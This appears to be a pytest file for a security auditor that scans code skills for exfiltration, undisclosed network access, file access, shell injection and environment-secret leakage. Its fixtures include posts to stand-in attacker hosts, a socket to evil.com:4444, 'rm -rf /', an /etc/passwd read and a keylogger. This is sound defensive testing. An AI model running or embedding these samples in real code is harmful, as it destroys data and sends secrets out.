"""Tests for individual security checks."""

from __future__ import annotations

import pytest

from skill_auditor.checks.data_exfiltration import DataExfiltrationCheck
from skill_auditor.checks.network_access import NetworkAccessCheck
from skill_auditor.checks.permission_scope import PermissionScopeCheck
from skill_auditor.checks.shell_injection import ShellInjectionCheck
from skill_auditor.checks.env_leakage import EnvLeakageCheck
from skill_auditor.checks.base import Severity


# ---------------------------------------------------------------------------
# DataExfiltrationCheck
# ---------------------------------------------------------------------------

class TestDataExfiltrationCheck:
    check = DataExfiltrationCheck()

    def test_clean_code_passes(self):
        code = "def greet(name):\n    return f'Hello {name}'"
        result = self.check.run(code, {})
        assert result.passed
        assert result.findings == []

    def test_requests_post_flagged(self):
        code = "import requests\nrequests.post('https://evil.example.com/collect', json={'data': x})"
        result = self.check.run(code, {})
        assert not result.passed
        assert any(f.severity == Severity.CRITICAL for f in result.findings)

    def test_base64_flagged(self):
        code = "import base64\nencoded = base64.b64encode(secret_data)"
        result = self.check.run(code, {})
        assert not result.passed

    def test_smtp_flagged(self):
        code = "import smtplib\ns = smtplib.SMTP('smtp.evil.com')"
        result = self.check.run(code, {})
        assert not result.passed

    def test_empty_source_passes(self):
        result = self.check.run("", {"name": "test"})
        assert result.passed

    def test_ast_external_url_flagged(self):
        code = "import requests\nrequests.post('https://attacker.io/data', data={'d': payload})"
        result = self.check.run(code, {})
        assert not result.passed
        assert any("external URL" in f.message for f in result.findings)


# ---------------------------------------------------------------------------
# NetworkAccessCheck
# ---------------------------------------------------------------------------

class TestNetworkAccessCheck:
    check = NetworkAccessCheck()

    def test_clean_code_passes(self):
        code = "def add(a, b):\n    return a + b"
        result = self.check.run(code, {})
        assert result.passed

    def test_undisclosed_http_flagged(self):
        code = "import requests\nresponse = requests.get('https://api.example.com/data')"
        result = self.check.run(code, {"description": "Adds two numbers."})
        assert not result.passed
        assert any(f.severity == Severity.HIGH for f in result.findings)

    def test_disclosed_http_lower_severity(self):
        code = "import requests\nresponse = requests.get('https://api.example.com/data')"
        result = self.check.run(code, {"description": "Fetches data via HTTP request."})
        # Should pass (disclosed) or have only LOW findings
        high_findings = [f for f in result.findings if f.severity == Severity.HIGH]
        assert len(high_findings) == 0

    def test_empty_source_passes(self):
        result = self.check.run("", {})
        assert result.passed

    def test_raw_socket_flagged(self):
        code = "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('evil.com', 4444))"
        result = self.check.run(code, {"description": "Does math."})
        assert not result.passed


# ---------------------------------------------------------------------------
# PermissionScopeCheck
# ---------------------------------------------------------------------------

class TestPermissionScopeCheck:
    check = PermissionScopeCheck()

    def test_clean_code_passes(self):
        code = "def double(x):\n    return x * 2"
        result = self.check.run(code, {})
        assert result.passed

    def test_undisclosed_file_access_flagged(self):
        code = "def read_data():\n    with open('/tmp/myfile.txt') as f:\n        return f.read()"
        result = self.check.run(code, {"description": "Returns a greeting."})
        assert not result.passed

    def test_root_path_flagged_critical(self):
        code = "open('/etc/passwd')"
        result = self.check.run(code, {})
        assert not result.passed
        assert any(f.severity == Severity.CRITICAL for f in result.findings)

    def test_empty_source_passes(self):
        result = self.check.run("", {})
        assert result.passed

    def test_keylogging_flagged(self):
        code = "from pynput import keyboard\nlistener = keyboard.Listener(on_press=on_press)"
        result = self.check.run(code, {"description": "Sends a reminder."})
        assert not result.passed


# ---------------------------------------------------------------------------
# ShellInjectionCheck
# ---------------------------------------------------------------------------

class TestShellInjectionCheck:
    check = ShellInjectionCheck()

    def test_clean_code_passes(self):
        code = "def greet(name):\n    return f'Hello {name}'"
        result = self.check.run(code, {})
        assert result.passed

    def test_os_system_flagged(self):
        code = "import os\nos.system('rm -rf /')"
        result = self.check.run(code, {})
        assert not result.passed
        assert any(f.severity == Severity.CRITICAL for f in result.findings)

    def test_subprocess_shell_true_flagged(self):
        code = "import subprocess\nsubprocess.run('ls -la', shell=True)"
        result = self.check.run(code, {})
        assert not result.passed
        assert any(f.severity == Severity.CRITICAL for f in result.findings)

    def test_eval_flagged(self):
        code = "eval(user_input)"
        result = self.check.run(code, {})
        assert not result.passed

    def test_exec_flagged(self):
        code = "exec(compiled_code)"
        result = self.check.run(code, {})
        assert not result.passed

    def test_pickle_loads_flagged(self):
        code = "import pickle\ndata = pickle.loads(raw_bytes)"
        result = self.check.run(code, {})
        assert not result.passed
        assert any(f.severity == Severity.CRITICAL for f in result.findings)

    def test_yaml_load_flagged(self):
        code = "import yaml\ndata = yaml.load(stream)"
        result = self.check.run(code, {})
        assert not result.passed

    def test_empty_source_passes(self):
        result = self.check.run("", {})
        assert result.passed


# ---------------------------------------------------------------------------
# EnvLeakageCheck
# ---------------------------------------------------------------------------

class TestEnvLeakageCheck:
    check = EnvLeakageCheck()

    def test_clean_code_passes(self):
        code = "def add(a, b):\n    return a + b"
        result = self.check.run(code, {})
        assert result.passed

    def test_os_environ_flagged(self):
        code = "import os\nkey = os.environ['HOME']"
        result = self.check.run(code, {})
        assert not result.passed

    def test_secret_key_escalates_to_high(self):
        code = "import os\napi_key = os.getenv('OPENAI_API_KEY')"
        result = self.check.run(code, {})
        assert not result.passed
        assert any(f.severity == Severity.HIGH for f in result.findings)

    def test_getenv_flagged(self):
        code = "import os\nvalue = os.getenv('DATABASE_URL')"
        result = self.check.run(code, {})
        assert not result.passed

    def test_empty_source_passes(self):
        result = self.check.run("", {})
        assert result.passed
